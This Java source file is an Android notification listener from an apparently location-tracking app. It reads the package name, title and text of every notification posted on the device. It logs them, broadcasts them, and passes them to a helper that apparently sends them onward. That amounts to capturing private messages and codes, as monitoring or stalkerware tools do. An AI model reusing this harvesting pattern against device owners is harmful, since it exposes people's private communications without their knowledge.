package notifications;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.varbin.locationtracker.APIs.CreaterClass;

public class NotificationService extends NotificationListenerService {

    Context context;

    @Override

    public void onCreate() {

        super.onCreate();
        context = getApplicationContext();

    }
    @Override

    public void onNotificationPosted(StatusBarNotification sbn) {


        String pack = sbn.getPackageName();
//        String ticker = sbn.getNotification().tickerText.toString();
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString("android.title");
        if (extras.getCharSequence("android.text")== null){
            return;
        }
        String text = extras.getCharSequence("android.text").toString();
        Log.d("TAG", "onNotificationPosted: title "+title );
        Log.d("TAG", "onNotificationPosted: text"+text );
        Log.i("onNotification pack ",pack);
        Intent msgrcv = new Intent("Msg");
        msgrcv.putExtra("package", pack);
//        msgrcv.putExtra("ticker", ticker);
        msgrcv.putExtra("title", title);
        msgrcv.putExtra("text", text);
        CreaterClass.sendNotification(pack , text , title , getApplicationContext());
        LocalBroadcastManager.getInstance(context).sendBroadcast(msgrcv);


    }

    @Override

    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.i("Msg","Notification Removed");

    }
}